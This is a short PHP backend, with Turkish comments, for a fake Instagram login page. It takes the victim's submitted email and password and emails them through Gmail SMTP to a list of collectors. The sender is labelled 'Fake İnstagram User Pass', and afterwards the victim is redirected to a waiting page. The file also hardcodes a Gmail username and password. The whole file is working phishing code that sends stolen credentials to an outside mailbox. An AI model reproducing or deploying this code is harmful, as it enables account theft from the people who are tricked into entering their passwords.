<?php

$ıd=$_POST['name'];
$sifre=$_POST['password'];
	  


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

//Post metodu ile gönderilen verilerimizi alıyoruz.
$Ad=htmlspecialchars(strip_tags(addslashes(stripslashes($_POST["name"]))));
$Soyad=htmlspecialchars(strip_tags(addslashes(stripslashes($_POST["password"]))));			
			


$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Mailer = "smtp";
$mail->SMTPDebug  = 2;  
$mail->SMTPAuth   = TRUE;
$mail->SMTPSecure = "tls";
$mail->Port       = 587;
$mail->Host       = "smtp.gmail.com";
$mail->Username   = "vaveyle2233@gmail.com";
$mail->Password   = "f7e49e1a";
$mail->CharSet = 'utf-8';
$mail->setlanguage('tr');
	
	$mail->IsHTML(true);
	
$file = fopen("mail/mail.txt",'r');
while(!feof($file)){ 
        $satir = fgets($file);
        $mail->AddAddress($satir, "İsim");                                                
}
fclose($file);


$mail->SetFrom("vaveyle2233@gmail.com", "Fake İnstagram User Pass");


$mail->Subject = "Fake Scriptten Bir Kullanıcı Giriş Yaptı";
$content = "Şifre: <b>".$Soyad."</b><br><br>Gönderen kişinin emaili:<b> ".$Ad."</b>";

	
  	$mail->MsgHTML($content); 
if(!$mail->Send()) {
  echo "Mesajınız gönderilemedi anasayfaya yönlendiriliyorsunuz";
  var_dump($mail);
} else {
  
	echo '<meta http-equiv="refresh" content="0;url=bekle.php">';

	}
	
?>




